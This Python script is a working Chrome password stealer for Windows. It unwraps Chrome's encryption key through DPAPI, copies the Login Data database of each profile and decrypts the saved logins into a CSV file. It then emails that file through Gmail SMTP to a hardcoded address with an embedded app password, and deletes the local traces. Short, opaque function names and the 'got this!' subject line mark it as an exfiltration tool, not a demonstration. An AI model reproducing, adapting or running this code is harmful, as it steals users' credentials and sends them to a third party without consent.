from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email import encoders
import smtplib
import ssl
import os
import re
import sys
import json
import base64
import sqlite3
import win32crypt
from Cryptodome.Cipher import AES
import shutil
import csv

CHROME_STATE = os.path.normpath(r"%s\\AppData\\Local\\Google\\Chrome\\User Data\\Local State" % (os.environ['USERPROFILE']))
CHROME_PATH = os.path.normpath(r"%s\\AppData\\Local\\Google\\Chrome\\User Data" % (os.environ['USERPROFILE']))
sport, sServer, efrom, eto, passd, subject, msg_body, filename = 587, "smtp.gmail.com", "serviceit983@gmail.com", "serviceit983@gmail.com", "cnidauzauwrctbis", "got this!", "message", "C:\\Users\\Public\\Documents\\tmpfile.csv"
context = ssl.create_default_context()

def _s(eto, fname):
    msg = MIMEMultipart()
    msg['From'], msg['To'], msg['Subject'] = efrom, eto, subject
    msg.attach(MIMEText(msg_body, 'plain'))
    att = open(fname, 'rb')
    enc = MIMEBase("application", "octet-stream")
    enc.set_payload(att.read())
    encoders.encode_base64(enc)
    enc.add_header('Content-Disposition', "attachment; filename= " + fname)
    msg.attach(enc)
    tex = msg.as_string()
    connect = smtplib.SMTP(sServer, sport)
    connect.starttls(context=context)
    connect.login(efrom, passd)
    connect.sendmail(efrom, eto, tex)
    connect.quit()
    att.close()

def _k():
    try:
        with open(CHROME_STATE, "r", encoding='utf-8') as f:
            _local_state = f.read()
            _local_state = json.loads(_local_state)
            _s_key = base64.b64decode(_local_state["os_crypt"]["encrypted_key"])
            _s_key = _s_key[5:]
            return win32crypt.CryptUnprotectData(_s_key, None, None, None, 0)[1]
    except Exception as e:
        print("[ERR] Chrome secret key not found:", e)
        return None

def _d(c, p):
    return c.decrypt(p)

def _gc(k, iv):
    return AES.new(k, AES.MODE_GCM, iv)

def _dp(ct, _s_key):
    try:
        iv, enc = ct[3:15], ct[15:-16]
        cipher = _gc(_s_key, iv)
        return _d(cipher, enc).decode()
    except Exception as e:
        print("[ERR] Decryption failed:", e)
        return ""

def _con(db):
    try:
        shutil.copy2(db, "C:\\Users\\Public\\Documents\\Loginvault.db")
        return sqlite3.connect("C:\\Users\\Public\\Documents\\Loginvault.db")
    except Exception as e:
        print("[ERR] Cannot copy db:", e)
        return None

if __name__ == '__main__':
    try:
        with open(filename, mode='w', newline='', encoding='utf-8') as dp_file:
            writer = csv.writer(dp_file, delimiter=',')
            writer.writerow(["index", "url", "username", "password"])
            _s_key = _k()
            for folder in [el for el in os.listdir(CHROME_PATH) if re.search("^Profile*|^Default$", el)]:
                db_path = os.path.normpath(r"%s\\%s\\Login Data" % (CHROME_PATH, folder))
                conn = _con(db_path)
                if _s_key and conn:
                    cur = conn.cursor()
                    cur.execute("SELECT action_url, username_value, password_value FROM logins")
                    for i, log in enumerate(cur.fetchall()):
                        u, n, ct = log[0], log[1], log[2]
                        if u != "" and n != "" and ct != "":
                            writer.writerow([i, u, n, _dp(ct, _s_key)])
                    cur.close()
                    conn.close()
                    os.remove("C:\\Users\\Public\\Documents\\Loginvault.db")
    except Exception as e:
        print("[ERR]", e)
    _s(eto, filename)
    os.remove(filename)
